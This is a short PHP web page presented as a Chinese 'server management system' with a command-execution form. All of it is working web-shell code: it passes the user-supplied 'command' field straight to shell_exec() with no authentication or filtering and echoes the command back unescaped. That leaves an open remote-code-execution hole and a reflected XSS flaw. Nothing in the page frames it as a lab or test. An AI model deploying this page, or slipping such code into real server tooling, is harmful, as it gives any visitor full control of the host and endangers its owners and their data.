<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DKY服务器管理系统</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .command-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        .command-container h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .command-container input[type="text"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .command-container button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .command-container button:hover {
            background-color: #45a049;
        }
        .output {
            margin-top: 20px;
            white-space: pre-wrap;
            background-color: #f9f9f9;
            padding: 0 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="command-container">
        <h2>指令执行系统</h2>
        <form method="post">
            <input type="text" name="command" placeholder="请输入命令" required>
            <button type="submit">执行</button>
        </form>
        <div class="output">
            <?php
            if ($_SERVER["REQUEST_METHOD"] == "POST") {
                $command = $_POST['command'];
                $output = shell_exec($command);
                echo '$ '.$command.'<br>'.htmlspecialchars($output);
            }
            ?>
        </div>
    </div>
</body>
</html>